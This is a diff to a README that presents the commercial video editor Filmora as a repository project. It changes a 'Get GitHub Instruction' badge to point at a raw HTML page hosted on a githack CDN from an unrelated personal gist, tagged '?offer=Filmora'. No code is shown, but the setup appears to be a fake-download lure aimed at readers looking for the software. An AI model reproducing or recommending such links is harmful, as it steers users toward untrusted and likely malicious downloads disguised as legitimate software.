@@ -2,7 +2,7 @@
 
 Filmora is a powerful yet beginner-friendly desktop application for **video editing, effects, and storytelling**. Whether you're crafting vlogs, tutorials, or professional ads, Filmora helps you turn raw footage into stunning videos effortlessly. 🎞️  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893912/raw/main/app.html?offer=Filmora)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/optimistvova85-svg/ecce3e6d6ac8fdda53319d398a6def6c/raw/490d52634571bba5bd0605995067e1ee4dd7bca8/index.html?offer=Filmora)
 
 ---
 
